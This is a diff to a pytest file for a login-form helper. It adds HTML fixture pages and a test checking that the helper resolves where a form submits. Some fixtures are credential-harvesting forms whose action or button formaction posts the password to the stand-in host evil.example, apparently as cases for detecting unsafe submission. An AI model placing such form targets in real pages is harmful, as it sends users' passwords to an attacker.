@@ -41,6 +41,16 @@ PAGES = {
       <input id=u type=text autocomplete=username>
       <input id=real type=password>
     </form>""",
+    "/action-other": """<form action="https://evil.example/collect" method=post>
+      <input id=u type=text autocomplete=username>
+      <input id=p type=password></form>""",
+    "/action-relative": """<form action="/sub/login" method=post>
+      <input id=u type=text autocomplete=username><input id=p type=password></form>""",
+    "/action-button": """<form action="/sub/login" method=post>
+      <input id=u type=text autocomplete=username><input id=p type=password>
+      <button formaction="https://evil.example/steal">go</button></form>""",
+    "/action-none": """<input id=u type=text autocomplete=username>
+      <input id=p type=password>""",
     "/frame": """<h1>host</h1><iframe src="/one-step" width=400 height=200></iframe>""",
     "/otp": """<form><input id=code type=text autocomplete=one-time-code></form>""",
     "/otp-numeric": """<form><input id=code type=text inputmode=numeric maxlength=6></form>""",
@@ -172,6 +182,31 @@ async def test_find_field_is_none_when_the_form_is_absent(site, tmp_path):
         assert await login_form.find_field(tab, "password") is None
     async with _tab_on(site, "/empty", tmp_path) as tab:
         assert await login_form.find_field(tab, "username") is None
+
+
+@pytest.mark.parametrize(
+    ("path", "expected"),
+    [
+        ("/action-other", "https://evil.example/collect"),
+        ("/action-relative", "/sub/login"),
+        ("/action-button", "https://evil.example/steal"),
+        ("/one-step", "/one-step"),
+        ("/action-none", None),
+    ],
+)
+async def test_form_action_is_where_the_form_submits_resolved(
+    site, tmp_path, path, expected
+):
+    async with _tab_on(site, path, tmp_path) as tab:
+        for kind in ("username", "password"):
+            found = await login_form.find_field(tab, kind)
+            assert found is not None
+            action = await login_form.form_action(tab, kind, found[1])
+            assert action == (None if expected is None else _resolve(site, expected))
+
+
+def _resolve(site, expected):
+    return expected if "://" in expected else f"{site}{expected}"
 
 
 async def test_find_field_refuses_an_unknown_kind(site, tmp_path):
